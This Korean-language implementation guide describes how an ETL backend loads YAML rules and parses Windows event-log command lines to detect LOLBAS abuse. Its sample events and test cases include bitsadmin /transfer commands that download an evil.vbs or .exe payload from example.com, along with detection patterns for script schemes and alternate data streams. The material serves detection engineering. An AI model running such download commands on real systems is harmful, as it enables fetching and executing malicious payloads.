# guide-etl.v2.md

## 문서 목적

본 문서는 **Windows LOLBAS CommandLine Parsing Rule Specification v2** 를 실제 ETL 파이프라인에서 해석하고 처리하기 위한 **ETL/backend 구현 가이드**입니다.
즉, 보안 담당자가 관리하는 YAML 룰 파일을 입력으로 받아,
이벤트 로그에서 `CommandLine` 기반 LOLBAS 행위를 식별하고, 정규식 파싱과 후처리를 거쳐 정규화된 분석 결과를 생성하는 기준을 정리합니다.

이 문서는 룰 자체를 정의하는 문서가 아니라 **룰 해석 및 실행 문서**입니다.
룰 구조, 필드 규격, 운영용 YAML 패턴은 별도 문서인 **`guide.v2.md`** 에서 관리합니다.

## 문서 관계

- `guide.v2.md`: 보안 담당자 관점의 룰 정의, 필드 규격, 패턴 작성 기준, 운영용 YAML
- `guide-etl.v2.md`: ETL/backend 관점의 YAML 로딩, trigger 평가, parser 적용, post_process 해석, 정규화 저장

즉, `guide.v2.md` 가 **무엇을 정의할 것인가**에 대한 문서라면,
`guide-etl.v2.md` 는 **그 정의를 ETL에서 어떻게 해석하고 처리할 것인가**에 대한 문서입니다.

---

# 1. 처리 범위

본 문서의 처리 범위는 다음과 같습니다.

- YAML 룰 파일 로딩
- 룰 기본 유효성 검증
- 로그 이벤트와 룰의 `trigger` 매칭
- `target_field` 추출
- `parser.pattern` 적용
- 캡처 필드 추출
- `post_process` 실행
- 정규화 결과 생성
- 저장 및 후속 분석용 공통 필드 구성

본 문서는 다음을 직접 다루지 않습니다.

- 탐지 정책 수립 자체
- 룰 내용 승인 절차
- UI/관리 화면 설계
- SIEM/EDR 별 수집기 구현 상세
- 룰 파일 배포 방식

---

# 2. 기본 처리 원칙

## 2-1. 역할 분리

- **보안 담당자**는 YAML 룰을 관리합니다.
- **ETL/backend** 는 YAML 을 해석하고 실행합니다.

즉, YAML 은 선언형 정의만 담고,
실행 의미는 ETL/backend 가 고정된 규칙으로 해석합니다.

## 2-2. 입력 이벤트 원칙

ETL 은 원본 이벤트에서 아래와 같은 공통 필드를 최대한 확보하는 것을 권장합니다.

- `EventID`
- `ProviderName`
- `Channel`
- `TimeCreated`
- `Computer`
- `User`
- `Image` 또는 `NewProcessName`
- `CommandLine`
- `ParentImage`
- `ParentCommandLine`
- `ProcessId`
- `ParentProcessId`
- `OriginalRaw`

## 2-3. 파싱 대상 원칙

LOLBAS 파싱의 핵심 대상 필드는 기본적으로 아래입니다.

```text
CommandLine
```

단, trigger 평가 시에는 `Image`, `NewProcessName`, `ParentImage`, `EventID` 등도 함께 사용될 수 있습니다.

## 2-4. 선언과 실행의 분리

YAML 의 아래 항목은 선언형 데이터이며, ETL 은 이를 해석하여 실행합니다.

- `trigger`
- `target_field`
- `parser.type`
- `parser.pattern`
- `output`
- `post_process`
- `severity`
- `tags`

---

# 3. YAML 로딩 규칙

## 3-1. 파일 단위

ETL 은 다음 두 운영 방식을 모두 수용 가능하게 설계하는 것을 권장합니다.

### 방식 A. 단일 번들 파일
- 예: `windows_lolbas_v2.yml`

### 방식 B. 룰 분리 파일
- 예: `bitsadmin.yml`
- 예: `certutil.yml`
- 예: `mshta.yml`
- 예: `regsvr32.yml`
- 예: `rundll32.yml`

운영 규모가 작을 때는 단일 파일,
규모가 커지면 룰 분리 파일을 병합하는 구조가 유리합니다.

## 3-2. 로딩 시 검증 항목

ETL 은 YAML 로딩 시 최소 아래 항목을 검증해야 합니다.

- `version` 존재 여부
- `rules` 배열 존재 여부
- 각 rule 의 `id` 중복 여부
- `status` 값 유효성
- `parser.type` 지원 여부
- `parser.pattern` 존재 여부
- `output` 배열 존재 여부
- `target_field` 존재 여부

## 3-3. 권장 실패 처리

- YAML 전체가 파손된 경우: 파일 단위 로딩 실패
- 특정 rule 만 문제인 경우: 해당 rule 비활성 처리 후 오류 로그 기록
- 중복 `id` 발견 시: 배포 실패 또는 마지막 rule 우선 정책 중 하나를 고정

권장 기본값은 아래입니다.

- **중복 ID는 오류로 간주**
- **잘못된 rule 은 skip**
- **skip 된 rule 목록을 진단 로그로 남김**

---

# 4. ETL 내부 정규화 이벤트 모델

YAML 적용 전, 원본 이벤트는 내부 공통 모델로 정규화하는 것이 좋습니다.

예시:

```json
{
  "event_id": 4688,
  "provider": "Microsoft-Windows-Security-Auditing",
  "channel": "Security",
  "timestamp": "2026-03-26T10:21:33Z",
  "computer": "DESKTOP-01",
  "user": "NT AUTHORITY\\SYSTEM",
  "image": "C:\\Windows\\System32\\bitsadmin.exe",
  "commandline": "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer \"mydownload\" \"http://example.com/download.log:evil.vbs\" \"C:\\temp\\local.vbs\"",
  "parent_image": "C:\\Windows\\System32\\cmd.exe",
  "process_id": 1234,
  "parent_process_id": 567,
  "raw": "..."
}
```

권장 내부 키명은 소문자 snake_case 또는 lower camelCase 중 하나로 통일합니다.
중요한 것은 **YAML trigger 해석 대상 키와 내부 이벤트 키의 매핑을 명확히 유지하는 것**입니다.

---

# 5. Trigger 평가 규칙

## 5-1. Trigger 목적

Trigger 는 전체 이벤트 중에서 **이 rule 을 적용할 후보인지 빠르게 판정**하기 위한 단계입니다.
즉, 정규식 파싱 전에 수행하는 1차 필터입니다.

## 5-2. 지원 권장 연산자

### image
```yaml
image:
  endswith:
    - '\bitsadmin.exe'
```

### commandline contains
```yaml
commandline:
  contains:
    - '/transfer'
```

### commandline regex
```yaml
commandline:
  regex:
    - '(?i)\b(?:javascript|vbscript):'
```

### event_id
```yaml
log_source:
  event_id:
    - 4688
    - 1
```

## 5-3. Trigger 평가 순서 권장

성능상 아래 순서를 권장합니다.

1. `status != enabled` 이면 skip
2. `log_source.event_id` 검사
3. `image.endswith` 검사
4. `commandline.contains` 검사
5. `commandline.regex` 검사
6. 모두 만족 시 parser 적용

## 5-4. 대소문자 처리

Windows 경로와 실행 파일명은 대소문자 구분 없이 비교하는 것을 권장합니다.
`contains`, `endswith`, `regex` 모두 기본적으로 case-insensitive 기준으로 통일하는 것이 운영상 안정적입니다.

---

# 6. Target Field 추출 규칙

YAML 의 `target_field` 는 ETL 내부 이벤트 모델의 특정 필드와 연결됩니다.

예:

```yaml
target_field: CommandLine
```

ETL 에서는 이를 내부 키인 `commandline` 으로 매핑하여 사용합니다.

## 6-1. 권장 매핑 테이블

| YAML 필드명 | 내부 이벤트 키 |
|---|---|
| `CommandLine` | `commandline` |
| `Image` | `image` |
| `ParentCommandLine` | `parent_commandline` |
| `ParentImage` | `parent_image` |

## 6-2. 대상 필드 누락 시 처리

- `target_field` 값이 이벤트에 없으면 해당 rule 은 `no_target_field` 상태로 skip
- 진단 로그에는 rule id, event id, 누락 필드를 남김

---

# 7. Regex Parser 적용 규칙

## 7-1. 정규식 엔진 원칙

ETL 은 named capture group 을 지원하는 정규식 엔진을 사용해야 합니다.
권장 기능은 아래와 같습니다.

- named capture group
- multiline 미사용
- case-insensitive 지원
- extended / verbose 모드 지원

## 7-2. 패턴 적용 방식

- `parser.pattern` 은 rule 당 하나의 기본 패턴으로 처리
- 패턴이 매치되면 named capture 를 모두 수집
- 매치 실패 시 rule 적용 실패로 기록

## 7-3. 매치 결과 저장 원칙

예를 들어 아래 패턴이 있다고 가정합니다.

```yaml
pattern: '(?ix)
  ^\s*
  (?:
    "(?<image_quoted>[^"]*bitsadmin(?:\.exe)?)"
    |
    (?<image_plain>\S*bitsadmin(?:\.exe)?)
  )?
  \s*
  /transfer
  ...
'
```

ETL 은 매치 결과를 다음처럼 내부 추출 맵으로 유지합니다.

```json
{
  "image_quoted": "C:\\Windows\\System32\\bitsadmin.exe",
  "job_name_q": "mydownload",
  "remote_src_q": "http://example.com/download.log:evil.vbs",
  "local_dst_q": "C:\\temp\\local.vbs"
}
```

빈 캡처는 null 또는 empty string 중 하나로 통일하여 저장합니다.
권장값은 **null** 입니다.

---

# 8. Output 필드 처리 규칙

`output` 는 이 rule 이 의미 있게 추출하려는 필드 집합입니다.

예:

```yaml
output:
  - image_quoted
  - image_plain
  - job_name_q
  - job_name
  - remote_src_q
  - remote_src
  - local_dst_q
  - local_dst
```

## 8-1. Output 역할

- 후처리 대상 필드를 명시
- 저장 후보 필드를 제한
- 디버깅 시 보여줄 항목을 표준화

## 8-2. 권장 저장 전략

ETL 은 아래 두 층을 구분하는 것이 좋습니다.

### raw_captures
정규식이 직접 캡처한 값

### normalized_fields
후처리까지 반영한 최종 값

예:

```json
{
  "raw_captures": {
    "remote_src_q": "http://example.com/download.log:evil.vbs",
    "local_dst_q": "C:\\temp\\local.vbs"
  },
  "normalized_fields": {
    "remote_src": "http://example.com/download.log:evil.vbs",
    "local_dst": "C:\\temp\\local.vbs"
  }
}
```

---

# 9. Post Process 해석 규칙

`post_process` 는 YAML 에 선언된 문자열 목록이며,
ETL/backend 는 이를 **정해진 함수 문법**으로 해석합니다.

예:

```yaml
post_process:
  - coalesce:image=image_quoted,image_plain
  - normalize_windows_path:local_dst
  - detect_remote_url:remote_src
```

## 9-1. 해석 원칙

- 순서대로 실행
- 앞 단계 결과를 뒤 단계에서 참조 가능
- 존재하지 않는 입력 필드는 오류 대신 no-op 처리 권장

## 9-2. 권장 내장 함수

### coalesce
```text
coalesce:final=a,b,c
```
의미:
- `a`, `b`, `c` 순서로 값을 확인
- 첫 번째 유효 값을 `final` 필드에 저장

예:
```text
coalesce:remote_src=remote_src_q,remote_src
```

### trim
```text
trim:raw_prefix
```
의미:
- 문자열 앞뒤 공백 제거

### normalize_windows_path
```text
normalize_windows_path:local_dst
```
의미:
- 슬래시/백슬래시 일관화
- 앞뒤 따옴표 제거
- 불필요한 공백 제거
- 가능하면 환경 변수 미해석 상태 유지

### detect_remote_url
```text
detect_remote_url:remote_src
```
의미:
- `http://`, `https://`, `ftp://` 등 원격 URL 여부 판정
- 결과 예시: `remote_src_is_remote_url = true`

### detect_ads
```text
detect_ads:remote_src
```
의미:
- ADS 가능 패턴 존재 여부 판정
- 단순 drive letter 의 `C:` 와 구분해야 함
- 결과 예시: `remote_src_has_ads = true`

### detect_script_extension
```text
detect_script_extension:local_dst
```
의미:
- `.vbs`, `.js`, `.jse`, `.vbe`, `.wsf`, `.wsh`, `.hta`, `.ps1`, `.bat`, `.cmd`, `.dll`, `.exe` 등 확장자 판정
- 결과 예시: `local_dst_extension = ".vbs"`

### detect_script_scheme
```text
detect_script_scheme:target_path
```
의미:
- `javascript:` 또는 `vbscript:` 스킴 사용 여부 판정
- 결과 예시: `target_path_script_scheme = "javascript"`

### detect_sct
```text
detect_sct:remote_src
```
의미:
- `.sct` 확장자 여부 또는 scriptlet 관련 URL 여부 판정

## 9-3. 실패 처리

후처리 실패는 전체 rule 실패로 보지 않고,
가능하면 해당 후처리만 실패 처리하는 것이 좋습니다.

예:
- 정규식 캡처는 성공
- `normalize_windows_path` 만 실패
- 결과는 저장하되 warning 로그 남김

---

# 10. 정규화 결과 모델

ETL 은 최종 결과를 아래처럼 정규화하여 저장하는 것을 권장합니다.

```json
{
  "rule_id": "LOLBAS_BITSADMIN_TRANSFER_V2",
  "rule_name": "bitsadmin transfer extract v2",
  "lolbas": "bitsadmin",
  "category": "file_download",
  "severity": "high",
  "event_id": 4688,
  "timestamp": "2026-03-26T10:21:33Z",
  "computer": "DESKTOP-01",
  "image": "C:\\Windows\\System32\\bitsadmin.exe",
  "commandline": "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer \"mydownload\" \"http://example.com/download.log:evil.vbs\" \"C:\\temp\\local.vbs\"",
  "raw_captures": {
    "image_quoted": "C:\\Windows\\System32\\bitsadmin.exe",
    "job_name_q": "mydownload",
    "remote_src_q": "http://example.com/download.log:evil.vbs",
    "local_dst_q": "C:\\temp\\local.vbs"
  },
  "normalized_fields": {
    "image": "C:\\Windows\\System32\\bitsadmin.exe",
    "job_name": "mydownload",
    "remote_src": "http://example.com/download.log:evil.vbs",
    "local_dst": "C:\\temp\\local.vbs",
    "remote_src_is_remote_url": true,
    "remote_src_has_ads": true,
    "local_dst_extension": ".vbs"
  },
  "tags": ["lolbas", "bitsadmin", "transfer", "download"]
}
```

## 10-1. 저장 계층 권장

### 1차 저장
원본 이벤트

### 2차 저장
rule match 결과 + raw capture

### 3차 저장
정규화 필드 + enrichment 결과

이렇게 나누면 추후 포렌식 검증과 재처리가 쉬워집니다.

---

# 11. Rule 실행 결과 상태 코드 권장안

ETL 은 rule 적용 결과를 아래처럼 상태값으로 남기는 것을 권장합니다.

| 상태 | 의미 |
|---|---|
| `matched` | trigger 와 parser 모두 성공 |
| `trigger_miss` | trigger 조건 불일치 |
| `no_target_field` | 대상 필드 없음 |
| `parse_fail` | parser pattern 미일치 |
| `post_process_partial_fail` | 일부 후처리 실패 |
| `rule_invalid` | rule 자체 오류 |

이 상태값은 디버깅과 품질 관리에 매우 중요합니다.

---

# 12. 품질 관리 기준

## 12-1. 룰 테스트 데이터

각 rule 은 최소 아래 3종의 테스트 케이스를 가져야 합니다.

- 정상 매치 샘플
- 따옴표 포함 샘플
- 매치되지 않아야 하는 샘플

예: bitsadmin

### 매치되어야 하는 예
```text
bitsadmin /transfer myjob http://example.com/a.exe C:\temp\a.exe
```

```text
"C:\Windows\System32\bitsadmin.exe" /transfer "myjob" "http://example.com/a.exe" "C:\temp\a.exe"
```

### 매치되지 않아야 하는 예
```text
bitsadmin /list
```

## 12-2. 회귀 테스트

룰 수정 시에는 기존 샘플 전체에 대해 회귀 테스트를 수행해야 합니다.

권장 항목:
- rule id 별 성공/실패 개수
- 새 오탐 증가 여부
- 기존 정상 매치 손상 여부

---

# 13. 운영 로그 권장안

ETL/backend 는 최소 아래 수준의 진단 로그를 남기는 것이 좋습니다.

## 13-1. rule load log
- 로딩된 rule 개수
- skip 된 rule 개수
- 중복 ID 목록
- invalid rule 목록

## 13-2. processing log
- event 처리 건수
- rule match 건수
- parse_fail 건수
- post_process_partial_fail 건수

## 13-3. debug log
필요 시 아래 정보까지 남길 수 있어야 합니다.

- 적용된 rule id
- target_field 원문
- raw capture 결과
- post_process 전후 값

단, 운영 환경에서는 민감한 명령행 전체가 로그에 과도하게 남지 않도록 보안 정책을 함께 고려해야 합니다.

---

# 14. guide.v2.md 와의 연결 기준

`guide.v2.md` 에 정의된 아래 항목은 본 문서 기준으로 해석합니다.

| guide.v2.md 항목 | guide-etl.v2.md 해석 기준 |
|---|---|
| `trigger.image.endswith` | 내부 이벤트 `image` 에 대해 case-insensitive endswith 평가 |
| `trigger.commandline.contains` | 내부 이벤트 `commandline` 에 대해 포함 여부 평가 |
| `trigger.commandline.regex` | 내부 이벤트 `commandline` 에 대해 regex 평가 |
| `target_field` | 내부 공통 이벤트 모델의 필드 매핑 대상 |
| `parser.pattern` | named capture group 기반 정규식 |
| `output` | raw capture 및 normalized field 후보 목록 |
| `post_process` | ETL 내장 함수 체인 |
| `severity`, `tags` | 최종 정규화 결과 메타데이터 |

즉, 두 문서는 아래처럼 연결됩니다.

```text
guide.v2.md
  → 룰을 어떻게 작성할 것인가
  → 어떤 필드와 패턴을 선언할 것인가

guide-etl.v2.md
  → 그 선언을 ETL이 어떻게 해석할 것인가
  → 어떤 순서로 매칭/파싱/후처리/저장할 것인가
```

---

# 15. 결론

본 문서는 `guide.v2.md` 에 정의된 LOLBAS YAML 룰을 ETL/backend 에서 안정적으로 실행하기 위한 구현 기준 문서입니다.

핵심은 다음과 같습니다.

- YAML 은 선언형으로 유지
- ETL 은 고정된 해석 규칙으로 동작
- trigger 와 parser 를 분리
- raw capture 와 normalized field 를 분리
- post_process 는 순차 함수 체인으로 해석
- quoted / unquoted Windows CommandLine 을 모두 안정적으로 처리

이 기준을 따르면 보안 담당자는 YAML 만 관리하고,
ETL/backend 는 일관된 방식으로 LOLBAS 분석 결과를 생성할 수 있습니다.
